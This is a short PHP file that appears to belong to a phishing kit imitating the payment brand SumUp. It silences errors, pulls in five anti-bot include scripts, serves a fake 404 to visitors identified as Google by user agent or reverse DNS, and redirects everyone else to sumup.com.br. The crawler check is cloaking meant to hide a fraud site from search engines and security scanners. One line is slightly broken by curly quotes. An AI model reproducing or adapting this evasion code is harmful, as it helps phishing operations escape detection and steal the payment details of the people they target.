

<?php

error_reporting(0);

ini_set(“display_errors”, 0 );

include "../BOTS/anti0.php";

include "../BOTS/anti1.php";

include "../BOTS/anti2.php";

include "../BOTS/anti3.php";

include "../BOTS/anti4.php";

//----------------------------------------------------------------------------------------------------------------//

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

//----------------------------------------------------------------------------------------------------------------//

header('Location: http://sumup.com.br');
?>

















